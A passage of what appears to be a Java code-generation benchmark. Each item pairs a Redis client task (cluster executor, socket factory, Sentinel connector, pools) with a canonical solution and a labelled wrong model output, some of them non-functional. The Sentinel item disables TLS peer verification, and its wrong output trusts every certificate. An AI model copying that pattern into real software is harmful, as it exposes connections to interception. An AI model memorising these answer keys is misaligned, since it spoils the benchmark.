spyManager = spy(authXManager);\n        List<Connection> connections = new ArrayList<>();\n        \n        doAnswer(invocation -> {\n            Connection connection = spy((Connection) invocation.getArgument(0));\n            invocation.getArguments()[0] = connection;\n            connections.add(connection);\n            Object result = invocation.callRealMethod();\n            return result;\n        }).when(spyManager).addConnection(any(Connection.class));\n\n        JedisClientConfig spyConfig = DefaultJedisClientConfig.builder().authXManager(spyManager).build();\n        \n        ExecutorService executorService = Executors.newFixedThreadPool(2);\n        CountDownLatch latch = new CountDownLatch(1);\n        \n        try (JedisCluster jc = new JedisCluster(Collections.singleton(hostAndPort), spyConfig)) {\n            Runnable task = () -> {\n                while (latch.getCount() > 0) {\n                    jc.set(\"foo\", \"bar\");\n                }\n            };\n            Future task1 = executorService.submit(task);\n            Future task2 = executorService.submit(task);\n\n            await().pollInterval(ONE_HUNDRED_MILLISECONDS).atMost(ONE_SECOND)\n                    .until(connections::size, greaterThanOrEqualTo(2));\n\n            connections.forEach(conn -> {\n                verify(conn, atLeast(2)).reAuthenticate();\n            });\n            \n            latch.countDown();\n            task1.get();\n            task2.get();\n        } finally {\n            latch.countDown();\n            executorService.shutdown();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisClusterAuthManager {\n    private final HostAndPort hostAndPort;\n    private final IdpConfig idpConfig;\n    private final AuthXManager authXManager;\n    private final JedisClientConfig config;\n    private final ConnectionPoolConfig poolConfig;\n    private JedisPool jedisPool;\n\n    public RedisClusterAuthManager(HostAndPort hostAndPort) {\n        this.hostAndPort = hostAndPort;\n        this.jedisPool = new JedisPool(\n            new JedisPoolConfig(),\n            hostAndPort.getHostText(),\n            hostAndPort.getPort(),\n            config.getConnectionTimeout(),\n            authXManager.getToken(),\n            config.getSoTimeout()\n        );\n    }\n\n    public void executeRedisOperations() {\n        try (Jedis jedis = jedisPool.getResource()) {\n            jedis.set(\"testKey\", \"testValue\");\n            String value = jedis.get(\"testKey\");\n            System.out.println(\"Retrieved value: \" + value);\n            jedis.del(\"testKey\");\n        }\n    }\n\n    public void testReAuthentication() {\n        Thread[] threads = new Thread[10];\n        for (int i = 0; i < threads.length; i++) {\n            threads[i] = new Thread(this::executeRedisOperations);\n        }\n        for (Thread thread : threads) {\n            thread.start();\n        }\n        for (Thread thread : threads) {\n            thread.join();\n        }\n    }\n}"
  },
  {
    "Task_id": 321,
    "Instruction": "Task Description: Implement a Redis cluster command executor in Java that handles command execution with retry logic, connection management, and error handling for a Redis cluster environment.\n\nClass Description: ClusterCommandExecutor is a Redis cluster command executor that provides functionality to execute commands across a Redis cluster with support for retries, connection pooling, and handling of various Redis cluster-specific exceptions.\n\nAttributes:\n- provider: ClusterConnectionProvider - Manages connections to the Redis cluster nodes\n- maxAttempts: int - Maximum number of retry attempts for command execution\n- maxTotalRetriesDuration: Duration - Maximum duration for all retry attempts\n- log: Logger - Logger instance for debugging and error logging\n\nMethods:\n- close() -> void - Closes the connection provider and releases resources\n- broadcastCommand(CommandObject<T> commandObject) -> T - Executes a command across all nodes in the cluster and collects responses/errors\n- executeCommand(CommandObject<T> commandObject) -> T - Executes a command on the primary node with retry logic\n- executeCommandToReplica(CommandObject<T> commandObject) -> T - Executes a command on a replica node with retry logic\n- doExecuteCommand(CommandObject<T> commandObject, boolean toReplica) -> T - Internal method handling the execution logic with retries and error handling\n- execute(Connection connection, CommandObject<T> commandObject) -> T - Executes a command on a specific connection\n- handleConnectionProblem(int attemptsLeft, int consecutiveConnectionFailures, Instant doneDeadline) -> boolean - Handles connection issues with backoff and slot cache renewal\n- getBackoffSleepMillis(int attemptsLeft, Instant deadline) -> long - Calculates backoff sleep duration for retries\n- sleep(long sleepMillis) -> void - Sleeps for the specified milliseconds, handling interruptions",
    "Canonical_solution": "import redis.clients.jedis.CommandObject;\nimport redis.clients.jedis.Connection;\nimport redis.clients.jedis.ConnectionPool;\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.Protocol;\nimport redis.clients.jedis.exceptions.*;\nimport redis.clients.jedis.providers.ClusterConnectionProvider;\nimport redis.clients.jedis.util.IOUtils;\nimport java.time.Duration;\nimport java.time.Instant;\nimport java.util.Map;\nimport java.util.concurrent.ThreadLocalRandom;\nimport java.util.concurrent.TimeUnit;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class ClusterCommandExecutor implements CommandExecutor {\n\n  private final Logger log = LoggerFactory.getLogger(getClass());\n\n  public final ClusterConnectionProvider provider;\n  protected final int maxAttempts;\n  protected final Duration maxTotalRetriesDuration;\n\n  public ClusterCommandExecutor(ClusterConnectionProvider provider, int maxAttempts,\n      Duration maxTotalRetriesDuration) {\n    this.provider = provider;\n    this.maxAttempts = maxAttempts;\n    this.maxTotalRetriesDuration = maxTotalRetriesDuration;\n  }\n\n  @Override\n  public void close() {\n    this.provider.close();\n  }\n\n  @Override\n  public final <T> T broadcastCommand(CommandObject<T> commandObject) {\n    Map<String, ConnectionPool> connectionMap = provider.getConnectionMap();\n\n    boolean isErrored = false;\n    T reply = null;\n    JedisBroadcastException bcastError = new JedisBroadcastException();\n    for (Map.Entry<String, ConnectionPool> entry : connectionMap.entrySet()) {\n      HostAndPort node = HostAndPort.from(entry.getKey());\n      ConnectionPool pool = entry.getValue();\n      try (Connection connection = pool.getResource()) {\n        T aReply = execute(connection, commandObject);\n        bcastError.addReply(node, aReply);\n        if (isErrored) {\n        } else if (reply == null) {\n          reply = aReply;\n        } else if (reply.equals(aReply)) {\n        } else {\n          isErrored = true;\n          reply = null;\n        }\n      } catch (Exception anError) {\n        bcastError.addReply(node, anError);\n        isErrored = true;\n      }\n    }\n    if (isErrored) {\n      throw bcastError;\n    }\n    return reply;\n  }\n\n  @Override\n  public final <T> T executeCommand(CommandObject<T> commandObject) {\n    return doExecuteCommand(commandObject, false);\n  }\n\n  public final <T> T executeCommandToReplica(CommandObject<T> commandObject) {\n    return doExecuteCommand(commandObject, true);\n  }\n\n  private <T> T doExecuteCommand(CommandObject<T> commandObject, boolean toReplica) {\n    Instant deadline = Instant.now().plus(maxTotalRetriesDuration);\n\n    JedisRedirectionException redirect = null;\n    int consecutiveConnectionFailures = 0;\n    Exception lastException = null;\n    for (int attemptsLeft = this.maxAttempts; attemptsLeft > 0; attemptsLeft--) {\n      Connection connection = null;\n      try {\n        if (redirect != null) {\n          connection = provider.getConnection(redirect.getTargetNode());\n          if (redirect instanceof JedisAskDataException) {\n            connection.executeCommand(Protocol.Command.ASKING);\n          }\n        } else {\n          connection = toReplica ? provider.getReplicaConnection(commandObject.getArguments())\n              : provider.getConnection(commandObject.getArguments());\n        }\n\n        return execute(connection, commandObject);\n\n      } catch (JedisClusterOperationException jnrcne) {\n        throw jnrcne;\n      } catch (JedisConnectionException jce) {\n        lastException = jce;\n        ++consecutiveConnectionFailures;\n        log.debug(\"Failed connecting to Redis: {}\", connection, jce);\n        boolean reset = handleConnectionProblem(attemptsLeft - 1, consecutiveConnectionFailures, deadline);\n        if (reset) {\n          consecutiveConnectionFailures = 0;\n          redirect = null;\n        }\n      } catch (JedisRedirectionException jre) {\n        if (lastException == null || lastException instanceof JedisRedirectionException) {\n          lastException = jre;\n        }\n        log.debug(\"Redirected by server to {}\", jre.getTargetNode());\n        consecutiveConnectionFailures = 0;\n        redirect = jre;\n        if (jre instanceof JedisMovedDataException) {\n          provider.renewSlotCache(connection);\n        }\n      } finally {\n        IOUtils.closeQuietly(connection);\n      }\n      if (Instant.now().isAfter(deadline)) {\n        throw new JedisClusterOperationException(\"Cluster retry deadline exceeded.\");\n      }\n    }\n\n    JedisClusterOperationException maxAttemptsException\n        = new JedisClusterOperationException(\"No more cluster attempts left.\");\n    maxAttemptsException.addSuppressed(lastException);\n    throw maxAttemptsException;\n  }\n\n  protected <T> T execute(Connection connection, CommandObject<T> commandObject) {\n    return connection.executeCommand(commandObject);\n  }\n\n  private boolean handleConnectionProblem(int attemptsLeft, int consecutiveConnectionFailures, Instant doneDeadline) {\n    if (this.maxAttempts < 3) {\n      if (attemptsLeft == 0) {\n        provider.renewSlotCache();\n        return true;\n      }\n      return false;\n    }\n\n    if (consecutiveConnectionFailures < 2) {\n      return false;\n    }\n\n    sleep(getBackoffSleepMillis(attemptsLeft, doneDeadline));\n    provider.renewSlotCache();\n    return true;\n  }\n\n  private static long getBackoffSleepMillis(int attemptsLeft, Instant deadline) {\n    if (attemptsLeft <= 0) {\n      return 0;\n    }\n\n    long millisLeft = Duration.between(Instant.now(), deadline).toMillis();\n    if (millisLeft < 0) {\n      throw new JedisClusterOperationException(\"Cluster retry deadline exceeded.\");\n    }\n\n    long maxBackOff = millisLeft / (attemptsLeft * attemptsLeft);\n    return ThreadLocalRandom.current().nextLong(maxBackOff + 1);\n  }\n\n  protected void sleep(long sleepMillis) {\n    try {\n      TimeUnit.MILLISECONDS.sleep(sleepMillis);\n    } catch (InterruptedException e) {\n      throw new JedisClusterOperationException(e);\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class ClusterCommandExecutor {\n    private final ClusterConnectionProvider provider;\n    private final int maxAttempts;\n    private final Duration maxTotalRetriesDuration;\n    private final Logger log;\n\n    public ClusterCommandExecutor(ClusterConnectionProvider provider, int maxAttempts, Duration maxTotalRetriesDuration, Logger log) {\n        this.provider = provider;\n        this.maxAttempts = maxAttempts;\n        this.maxTotalRetriesDuration = maxTotalRetriesDuration;\n        this.log = log;\n    }\n\n    public void close() {\n        provider.close();\n    }\n\n    public <T> T broadcastCommand(CommandObject<T> commandObject) {\n        List<T> results = new ArrayList<>();\n        for (Connection node : provider.getNodes()) {\n            try {\n                results.add(execute(node, commandObject));\n            } catch (Exception e) {\n                log.warning(\"Error executing command on node: \" + e.getMessage());\n            }\n        }\n        return results.isEmpty() ? null : results.get(0);\n    }\n\n    public <T> T executeCommand(CommandObject<T> commandObject) {\n        return doExecuteCommand(commandObject, false);\n    }\n\n    public <T> T executeCommandToReplica(CommandObject<T> commandObject) {\n        return doExecuteCommand(commandObject, true);\n    }\n\n    private <T> T doExecuteCommand(CommandObject<T> commandObject, boolean toReplica) {\n        int attemptsLeft = maxAttempts;\n        Instant deadline = Instant.now().plus(maxTotalRetriesDuration);\n        while (attemptsLeft > 0) {\n            try {\n                Connection connection = provider.getConnection(toReplica);\n                T result = execute(connection, commandObject);\n                return result;\n            } catch (ConnectionException e) {\n                if (!handleConnectionProblem(attemptsLeft, 0, deadline)) {\n                    log.severe(\"Failed to execute command after all retries: \" + e.getMessage());\n                    throw new RuntimeException(e);\n                }\n                attemptsLeft--;\n                long sleepMillis = getBackoffSleepMillis(attemptsLeft, deadline);\n                sleep(sleepMillis);\n            } catch (Exception e) {\n                log.severe(\"Command execution failed: \" + e.getMessage());\n                throw new RuntimeException(e);\n            }\n        }\n        throw new RuntimeException(\"Max retry attempts exceeded\");\n    }\n\n    private <T> T execute(Connection connection, CommandObject<T> commandObject) throws Exception {\n        // Implement Redis command execution using the connection\n        return null;\n    }\n\n    private boolean handleConnectionProblem(int attemptsLeft, int consecutiveConnectionFailures, Instant deadline) {\n        if (attemptsLeft <= 0) {\n            return false;\n        }\n        long remainingTime = Duration.between(Instant.now(), deadline).toMillis();\n        long sleepMillis = getBackoffSleepMillis(attemptsLeft, deadline);\n        try {\n            sleep(sleepMillis);\n        } catch (InterruptedException e) {\n            log.warning(\"Interrupted during connection problem handling\");\n            Thread.currentThread().interrupt();\n            return false;\n        }\n        // Implement slot cache renewal logic if needed\n        return true;\n    }\n\n    private long getBackoffSleepMillis(int attemptsLeft, Instant deadline) {\n        long remainingTime = Duration.between(Instant.now(), deadline).toMillis();\n        long baseBackoff = 100; // ms\n        long backoff = (long) (Math.pow(2, attemptsLeft - 1) * baseBackoff);\n        return Math.min(backoff, remainingTime);\n    }\n\n    private void sleep(long sleepMillis) throws InterruptedException {\n        Thread.sleep(sleepMillis);\n    }\n}"
  },
  {
    "Task_id": 323,
    "Instruction": "Task Description: Create a Java class that implements a socket factory for establishing connections to Redis servers, supporting both regular and SSL/TLS connections with configurable timeouts and hostname verification.\n\nClass Description: DefaultJedisSocketFactory is a socket factory implementation for Redis client connections that handles both plain and SSL/TLS sockets, with support for connection timeouts, socket timeouts, host shuffling, and hostname verification.\n\nAttributes:\n- hostAndPort: HostAndPort - The Redis server address and port\n- connectionTimeout: int - Connection timeout in milliseconds\n- socketTimeout: int - Socket timeout in milliseconds\n- ssl: boolean - Flag indicating whether to use SSL/TLS\n- sslSocketFactory: SSLSocketFactory - Factory for creating SSL sockets\n- sslParameters: SSLParameters - SSL/TLS parameters\n- hostnameVerifier: HostnameVerifier - Hostname verifier for SSL/TLS\n- hostAndPortMapper: HostAndPortMapper - Mapper for host and port addresses\n\nMethods:\n- DefaultJedisSocketFactory() -> void - Default constructor using default host and port\n- DefaultJedisSocketFactory(HostAndPort hostAndPort) -> void - Constructor with specified host and port\n- DefaultJedisSocketFactory(JedisClientConfig config) -> void - Constructor with client configuration\n- DefaultJedisSocketFactory(HostAndPort hostAndPort, JedisClientConfig config) -> void - Constructor with both host/port and configuration\n- connectToFirstSuccessfulHost(HostAndPort hostAndPort) -> Socket - Internal method to establish connection to first available host\n- createSocket() -> Socket - Creates and returns a configured socket (plain or SSL) to Redis server\n- getSocketHostAndPort() -> HostAndPort - Returns the effective host and port after applying any mapping",
    "Canonical_solution": "import java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.util.Arrays;\nimport java.util.Collections;\nimport java.util.List;\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.SSLParameters;\nimport javax.net.ssl.SSLSocket;\nimport javax.net.ssl.SSLSocketFactory;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.util.IOUtils;\n\npublic class DefaultJedisSocketFactory implements JedisSocketFactory {\n\n  protected static final HostAndPort DEFAULT_HOST_AND_PORT = new HostAndPort(Protocol.DEFAULT_HOST,\n      Protocol.DEFAULT_PORT);\n\n  private volatile HostAndPort hostAndPort = DEFAULT_HOST_AND_PORT;\n  private int connectionTimeout = Protocol.DEFAULT_TIMEOUT;\n  private int socketTimeout = Protocol.DEFAULT_TIMEOUT;\n  private boolean ssl = false;\n  private SSLSocketFactory sslSocketFactory = null;\n  private SSLParameters sslParameters = null;\n  private HostnameVerifier hostnameVerifier = null;\n  private HostAndPortMapper hostAndPortMapper = null;\n\n  public DefaultJedisSocketFactory() {\n  }\n\n  public DefaultJedisSocketFactory(HostAndPort hostAndPort) {\n    this(hostAndPort, null);\n  }\n\n  public DefaultJedisSocketFactory(JedisClientConfig config) {\n    this(null, config);\n  }\n\n  public DefaultJedisSocketFactory(HostAndPort hostAndPort, JedisClientConfig config) {\n    if (hostAndPort != null) {\n      this.hostAndPort = hostAndPort;\n    }\n    if (config != null) {\n      this.connectionTimeout = config.getConnectionTimeoutMillis();\n      this.socketTimeout = config.getSocketTimeoutMillis();\n      this.ssl = config.isSsl();\n      this.sslSocketFactory = config.getSslSocketFactory();\n      this.sslParameters = config.getSslParameters();\n      this.hostnameVerifier = config.getHostnameVerifier();\n      this.hostAndPortMapper = config.getHostAndPortMapper();\n    }\n  }\n\n  private Socket connectToFirstSuccessfulHost(HostAndPort hostAndPort) throws Exception {\n    List<InetAddress> hosts = Arrays.asList(InetAddress.getAllByName(hostAndPort.getHost()));\n    if (hosts.size() > 1) {\n      Collections.shuffle(hosts);\n    }\n\n    JedisConnectionException jce = new JedisConnectionException(\"Failed to connect to \" + hostAndPort + \".\");\n    for (InetAddress host : hosts) {\n      try {\n        Socket socket = new Socket();\n\n        socket.setReuseAddress(true);\n        socket.setKeepAlive(true);\n        socket.setTcpNoDelay(true);\n        socket.setSoLinger(true, 0);\n\n        socket.connect(new InetSocketAddress(host, hostAndPort.getPort()), connectionTimeout);\n        return socket;\n      } catch (Exception e) {\n        jce.addSuppressed(e);\n      }\n    }\n    throw jce;\n  }\n\n  @Override\n  public Socket createSocket() throws JedisConnectionException {\n    Socket socket = null;\n    try {\n      HostAndPort _hostAndPort = getSocketHostAndPort();\n      socket = connectToFirstSuccessfulHost(_hostAndPort);\n      socket.setSoTimeout(socketTimeout);\n\n      if (ssl) {\n        SSLSocketFactory _sslSocketFactory = this.sslSocketFactory;\n        if (null == _sslSocketFactory) {\n          _sslSocketFactory = (SSLSocketFactory) SSLSocketFactory.getDefault();\n        }\n        Socket plainSocket = socket;\n        socket = _sslSocketFactory.createSocket(socket, _hostAndPort.getHost(), _hostAndPort.getPort(), true);\n\n        if (null != sslParameters) {\n          ((SSLSocket) socket).setSSLParameters(sslParameters);\n        }\n        socket = new SSLSocketWrapper((SSLSocket) socket, plainSocket);\n\n        if (null != hostnameVerifier\n            && !hostnameVerifier.verify(_hostAndPort.getHost(), ((SSLSocket) socket).getSession())) {\n          String message = String.format(\n            \"The connection to '%s' failed ssl/tls hostname verification.\", _hostAndPort.getHost());\n          throw new JedisConnectionException(message);\n        }\n      }\n\n      return socket;\n\n    } catch (Exception ex) {\n      IOUtils.closeQuietly(socket);\n      if (ex instanceof JedisConnectionException) {\n        throw (JedisConnectionException) ex;\n      } else {\n        throw new JedisConnectionException(\"Failed to create socket.\", ex);\n      }\n    }\n  }\n\n  protected HostAndPort getSocketHostAndPort() {\n    HostAndPortMapper mapper = hostAndPortMapper;\n    HostAndPort hap = this.hostAndPort;\n    if (mapper != null) {\n      HostAndPort mapped = mapper.getHostAndPort(hap);\n      if (mapped != null) {\n        return mapped;\n      }\n    }\n    return hap;\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class DefaultJedisSocketFactory {\n    private HostAndPort hostAndPort;\n    private int connectionTimeout;\n    private int socketTimeout;\n    private boolean ssl;\n    private SSLSocketFactory sslSocketFactory;\n    private SSLParameters sslParameters;\n    private HostnameVerifier hostnameVerifier;\n    private HostAndPortMapper hostAndPortMapper;\n\n    public DefaultJedisSocketFactory() {\n        this.hostAndPort = HostAndPort.from(\"localhost\", 6379);\n        this.connectionTimeout = 2000;\n        this.socketTimeout = 2000;\n        this.ssl = false;\n        this.sslSocketFactory = null;\n        this.sslParameters = null;\n        this.hostnameVerifier = null;\n        this.hostAndPortMapper = null;\n    }\n\n    public DefaultJedisSocketFactory(HostAndPort hostAndPort) {\n        this.hostAndPort = hostAndPort;\n        this.connectionTimeout = 2000;\n        this.socketTimeout = 2000;\n        this.ssl = false;\n        this.sslSocketFactory = null;\n        this.sslParameters = null;\n        this.hostnameVerifier = null;\n        this.hostAndPortMapper = null;\n    }\n\n    public DefaultJedisSocketFactory(JedisClientConfig config) {\n        this.hostAndPort = config.getHostAndPort();\n        this.connectionTimeout = config.getConnectionTimeout();\n        this.socketTimeout = config.getSocketTimeout();\n        this.ssl = config.isSSL();\n        this.sslSocketFactory = config.getSSLContext().getSocketFactory();\n        this.sslParameters = config.getSSLParameters();\n        this.hostnameVerifier = config.getHostNameVerifier();\n        this.hostAndPortMapper = config.getHostAndPortMapper();\n    }\n\n    public DefaultJedisSocketFactory(HostAndPort hostAndPort, JedisClientConfig config) {\n        this.hostAndPort = hostAndPort;\n        this.connectionTimeout = config.getConnectionTimeout();\n        this.socketTimeout = config.getSocketTimeout();\n        this.ssl = config.isSSL();\n        this.sslSocketFactory = config.getSSLContext().getSocketFactory();\n        this.sslParameters = config.getSSLParameters();\n        this.hostnameVerifier = config.getHostNameVerifier();\n        this.hostAndPortMapper = config.getHostAndPortMapper();\n    }\n\n    private Socket connectToFirstSuccessfulHost(HostAndPort hostAndPort) {\n        try {\n            HostAndPort mapped = hostAndPortMapper.map(hostAndPort);\n            Socket socket = createSocket();\n            socket.connect(new InetSocketAddress(mapped.getHostText(), mapped.getPort()), connectionTimeout);\n            return socket;\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to connect to host: \" + hostAndPort, e);\n        }\n    }\n\n    public Socket createSocket() {\n        Socket socket;\n        if (ssl) {\n            SSLSocket sslSocket = (SSLSocket) sslSocketFactory.createSocket();\n            sslSocket.setSSLParameters(sslParameters);\n            sslSocket.setHostnameVerifier(hostnameVerifier);\n            socket = sslSocket;\n        } else {\n            socket = new Socket();\n        }\n        socket.setSoTimeout(socketTimeout);\n        return socket;\n    }\n\n    public HostAndPort getSocketHostAndPort() {\n        return hostAndPortMapper.map(hostAndPort);\n    }\n}"
  },
  {
    "Task_id": 324,
    "Instruction": "Task Description: Create a Java class that provides functionality to connect to Redis Sentinel instances and Redis masters via Sentinel, with support for SSL/TLS connections and custom DNS resolution.\n\nClass Description: The RedisSentinelConnector class facilitates connections to Redis Sentinel servers and Redis master instances through Sentinel, with configurable SSL/TLS options and custom DNS resolution capabilities.\n\nAttributes:\n- clientResources: [ClientResources] - The Lettuce client resources configuration including custom DNS resolver and other client settings\n\nMethods:\n- RedisSentinelConnector([ClientResources clientResources]) -> [RedisSentinelConnector] - Constructor that initializes the connector with custom client resources including DNS resolution configuration\n- connectToSentinelDirectly([String host]) -> [StatefulRedisSentinelConnection<String, String>] - Establishes a direct connection to a Redis Sentinel server with SSL/TLS (peer verification disabled)\n- connectToMasterViaSentinel([String host, String masterId, File truststore]) -> [StatefulRedisConnection<String, String>] - Connects to a Redis master via Sentinel with SSL/TLS using the specified truststore for certificate verification\n- closeConnection([AutoCloseable connection, RedisClient client]) -> [void] - Safely closes the given connection and shuts down the associated Redis client",
    "Canonical_solution": "import io.lettuce.core.*;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.resource.ClientResources;\nimport io.lettuce.core.resource.DnsResolver;\nimport io.lettuce.core.resource.MappingSocketAddressResolver;\nimport io.lettuce.core.sentinel.api.StatefulRedisSentinelConnection;\nimport io.lettuce.test.resource.FastShutdown;\n\npublic class RedisSentinelConnector {\n\n    private final ClientResources clientResources;\n\n    public RedisSentinelConnector(ClientResources clientResources) {\n        this.clientResources = clientResources.mutate()\n                .socketAddressResolver(MappingSocketAddressResolver.create(DnsResolver.jvmDefault(), hostAndPort -> {\n                    return HostAndPort.of(hostAndPort.getHostText(), hostAndPort.getPort() + 443);\n                })).build();\n    }\n\n    public StatefulRedisSentinelConnection<String, String> connectToSentinelDirectly(String host) {\n        RedisURI redisURI = RedisURI.create(\"rediss://\" + host + \":\" + RedisURI.DEFAULT_SENTINEL_PORT);\n        redisURI.setVerifyPeer(false);\n\n        RedisClient client = RedisClient.create(clientResources);\n        StatefulRedisSentinelConnection<String, String> connection = client.connectSentinel(redisURI);\n        return connection;\n    }\n\n    public StatefulRedisConnection<String, String> connectToMasterViaSentinel(String host, String masterId, File truststore) {\n        RedisURI redisURI = RedisURI.create(\"rediss-sentinel://\" + host + \":\" + RedisURI.DEFAULT_SENTINEL_PORT\n                + \"?sentinelMasterId=\" + masterId);\n        SslOptions options = SslOptions.builder().truststore(truststore).build();\n\n        RedisClient client = RedisClient.create(clientResources);\n        client.setOptions(ClientOptions.builder().sslOptions(options).build());\n        StatefulRedisConnection<String, String> connection = client.connect(redisURI);\n        return connection;\n    }\n\n    public void closeConnection(AutoCloseable connection, RedisClient client) {\n        try {\n            if (connection != null) {\n                connection.close();\n            }\n        } finally {\n            if (client != null) {\n                FastShutdown.shutdown(client);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisSentinelConnector {\n    private final ClientResources clientResources;\n\n    public RedisSentinelConnector(ClientResources clientResources) {\n        this.clientResources = clientResources;\n    }\n\n    public StatefulRedisSentinelConnection<String, String> connectToSentinelDirectly(String host) {\n        RedisClient client = RedisClient.create(\"redis://@\" + host + \":26379\");\n        client.setOptions(ClientOptions.builder()\n                .clientResources(clientResources)\n                .ssl(SSLConfig.builder().enablePeerVerification(false).build())\n                .build());\n        return client.connectSentinel();\n    }\n\n    public StatefulRedisConnection<String, String> connectToMasterViaSentinel(String host, String masterId, File truststore) {\n        RedisClient sentinelClient = RedisClient.create(\"redis://@\" + host + \":26379\");\n        sentinelClient.setOptions(ClientOptions.builder()\n                .clientResources(clientResources)\n                .build());\n        SentinelCommands<String, String> sentinelCommands = sentinelClient.connectSentinel();\n        String masterAddress = sentinelCommands.masterAddr(masterId).block();\n        if (masterAddress == null) {\n            throw new RuntimeException(\"Master not found\");\n        }\n        String[] parts = masterAddress.split(\":\");\n        String masterHost = parts[0];\n        int masterPort = Integer.parseInt(parts[1]);\n\n        SSLContext sslContext = SSLContextBuilder.create()\n                .loadTrustMaterial(truststore, (chain, authType) -> true)\n                .build();\n\n        RedisClient masterClient = RedisClient.create(\"redis://@\" + masterHost + \":\" + masterPort);\n        masterClient.setOptions(ClientOptions.builder()\n                .clientResources(clientResources)\n                .ssl(SSLConfig.builder().sslContext(sslContext).build())\n                .build());\n        return masterClient.connect();\n    }\n\n    public void closeConnection(AutoCloseable connection, RedisClient client) {\n        if (connection != null) {\n            connection.close();\n        }\n        if (client != null) {\n            client.shutdown();\n        }\n    }\n}"
  },
  {
    "Task_id": 328,
    "Instruction": "Task Description: Create a Java class that manages a pool of Redis connections using Jedis, allowing concurrent operations on Redis with connection pooling for efficient resource utilization.\n\nClass Description: RedisConnectionPool is a utility class that manages a pool of Redis connections. It provides thread-safe access to Redis operations and handles connection lifecycle management.\n\nAttributes:\n- pool: JedisPool - The connection pool instance managing Redis connections\n- endpoint: EndpointConfig - Configuration object containing Redis connection details (host, port, password)\n\nMethods:\n- RedisConnectionPool(EndpointConfig endpoint) -> void - Constructor that initializes the Redis connection pool with the given endpoint configuration\n- executeOperations(int totalOperations) -> void - Executes a specified number of Redis SET/GET operations across multiple threads (50 threads by default)\n- close() -> void - Properly shuts down the connection pool and releases all resources",
    "Canonical_solution": "import redis.clients.jedis.*;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class RedisConnectionPool {\n\n    private JedisPool pool;\n    private EndpointConfig endpoint;\n\n    public RedisConnectionPool(EndpointConfig endpoint) {\n        this.endpoint = endpoint;\n        this.pool = new JedisPool(new GenericObjectPoolConfig<Jedis>(), \n            endpoint.getHost(), endpoint.getPort(), 2000, endpoint.getPassword());\n    }\n\n    public void executeOperations(int totalOperations) {\n        AtomicInteger ind = new AtomicInteger();\n        for (int i = 0; i < 50; i++) {\n            new Thread(() -> {\n                for (int j = 0; (j = ind.getAndIncrement()) < totalOperations;) {\n                    try (Jedis jedis = pool.getResource()) {\n                        String key = \"foo\" + j;\n                        jedis.set(key, key);\n                        jedis.get(key);\n                    } catch (Exception e) {\n                        e.printStackTrace();\n                    }\n                }\n            }).start();\n        }\n    }\n\n    public void close() {\n        if (pool != null) {\n            pool.destroy();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisConnectionPool {\n    private final JedisPool pool;\n    private final EndpointConfig endpoint;\n\n    public RedisConnectionPool(EndpointConfig endpoint) {\n        this.endpoint = endpoint;\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        pool = new JedisPool(poolConfig, endpoint.getHost(), endpoint.getPort(), 2000, endpoint.getPassword());\n    }\n\n    public void executeOperations(int totalOperations) {\n        int numThreads = 50;\n        ExecutorService executor = Executors.newFixedThreadPool(numThreads);\n        int operationsPerThread = totalOperations / numThreads;\n        int remainder = totalOperations % numThreads;\n\n        for (int i = 0; i < numThreads; i++) {\n            int ops = (i < remainder) ? operationsPerThread + 1 : operationsPerThread;\n            executor.submit(() -> {\n                for (int j = 0; j < ops; j++) {\n                    String key = \"testKey\" + System.currentTimeMillis() + j;\n                    try (Jedis jedis = pool.getResource()) {\n                        jedis.set(key, \"value\");\n                        String value = jedis.get(key);\n                    }\n                }\n            });\n        }\n        executor.shutdown();\n    }\n\n    public void close() {\n        if (pool != null) {\n            pool.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 329,
    "Instruction": "Task Description: Create a Java class that provides basic Redis interaction capabilities using the Lettuce client library, including connection management and key-value operations.\n\nClass Description: The RedisInteraction class encapsulates Redis connection and basic operations, providing methods to set/get values and manage the connection lifecycle.\n\nAttributes:\n- redisClient: RedisClient - The main Redis client instance used to create connections\n- connection: StatefulRedisConnection<String, String> - The active Redis connection\n- syncCommands: RedisCommands<String, String> - Synchronous command interface for Redis operations\n\nMethods:\n- RedisInteraction(String redisUri) -> void - Constructor that initializes the Redis client and establishes a connection using the provided URI\n- setValue(String key, String value) -> void - Stores a key-value pair in Redis\n- getValue(String key) -> String - Retrieves the value associated with the given key from Redis\n- closeConnection() -> void - Properly closes the Redis connection and shuts down the client",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\n\npublic class RedisInteraction {\n\n    private RedisClient redisClient;\n    private StatefulRedisConnection<String, String> connection;\n    private RedisCommands<String, String> syncCommands;\n\n    public RedisInteraction(String redisUri) {\n        this.redisClient = RedisClient.create(RedisURI.create(redisUri));\n        this.connection = redisClient.connect();\n        this.syncCommands = connection.sync();\n    }\n\n    public void setValue(String key, String value) {\n        syncCommands.set(key, value);\n    }\n\n    public String getValue(String key) {\n        return syncCommands.get(key);\n    }\n\n    public void closeConnection() {\n        connection.close();\n        redisClient.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
